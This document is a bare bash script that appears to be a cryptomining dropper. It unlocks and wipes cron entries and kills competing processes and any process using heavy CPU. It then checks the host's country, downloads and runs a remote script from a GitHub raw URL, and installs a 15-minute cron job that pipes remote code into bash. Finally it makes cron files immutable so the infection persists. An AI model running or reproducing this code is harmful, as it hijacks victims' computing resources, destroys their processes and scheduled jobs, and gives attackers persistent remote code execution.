#!/bin/bash
for file in /etc/cron.d/$(whoami) /etc/cron.d/apache /var/spool/cron/$(whoami) /var/spool/cron/crontabs/$(whoami) /etc/cron.hourly/oanacroner1; do
    [ -f "$file" ] && chattr -i -a "$file"
done
crontab -r
iptables -A INPUT -s 66.23.199.44 -j DROP 2>/dev/null
pkill -9 -f 'bash -s ' 2>/dev/null
for pid in $(pgrep -f 'bash /tmp/.*\.sh' 2>/dev/null); do
    [[ "$pid" != "$$" && "$pid" != "$PPID" ]] && kill -9 "$pid" 2>/dev/null
done
(( $(id -u) == 0 )) && systemctl stop systemd_s 2>/dev/null

check_system_specs() {
    local cpu=$(nproc 2>/dev/null || grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo 1)
    [[ $cpu -gt 8 && $  $EUID -eq 0 ]] && echo "VERY GOOD BOY!"
}
check_system_specs

kill_high_cpu_processes() {
    local exclude=("reservepattern454545" "oAwgBCFH")
    ps -eo pid,%cpu --sort=-%cpu | awk '$2>150 {print $1}' | while read -r pid; do
        cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null)
        for p in "${exclude[@]}"; do [[ "$cmd" == *"$p"* ]] && continue 2; done
        kill -9 "$pid" 2>/dev/null && echo "Killed high-CPU PID $pid"
    done
}
kill_high_cpu_processes

is_program_running() {
    for d in /proc/[0-9]*; do
        [[ -r "$d/cmdline" ]] || continue
        cmd=$(tr '\0' ' ' < "$d/cmdline")
        [[ "$cmd" == *"oAwgBCFH"* && "$cmd" != *" surgi"* ]] || continue
        [[ $(awk '{print $3}' "$d/stat" 2>/dev/null) == "Z" ]] && continue
        return 0
    done
    return 1
}

download_and_execute() {
    local url="https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/run.sh"
    local cn_url="https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/runCN.sh"
    local file="run.sh"
    curl -s --connect-timeout 3 -4 http://ip-api.com/json/ | grep -q '"country":"China"' && url="$cn_url"
    curl -fkso "$file" "$url" || wget -qO "$file" "$url" || return 1
    chmod +x "$file"
    sed -i 's/\r$//' "$file"
    bash "$file"
    rm -f "$file"
}

get_cpu_count() { grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1; }
is_ec2_host() { hostname | grep -qiE "ec2|compute"; }

if ! is_program_running; then
    [[ $(get_cpu_count) -gt 3 || $(is_ec2_host; echo $?) -eq 0 ]] && download_and_execute
fi

create_cronjob() {
    local cmd
    command -v curl >/dev/null && cmd="curl -fsSLk $1 | tr -d '\r' | bash"
    command -v wget >/dev/null && cmd="wget -qO- $1 | tr -d '\r' | bash"
    (crontab -l 2>/dev/null | grep -vF "$1"; echo "*/15 * * * * $cmd") | crontab -
}
create_cronjob "https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/mon.sh"

for file in /etc/cron.d/$(whoami) /etc/cron.d/apache /var/spool/cron/$(whoami) /var/spool/cron/crontabs/$(whoami) /etc/cron.hourly/oanacroner1 /etc/init.d/down; do
    [ -f "$file" ] && chattr +i +a "$file" 2>/dev/null
done
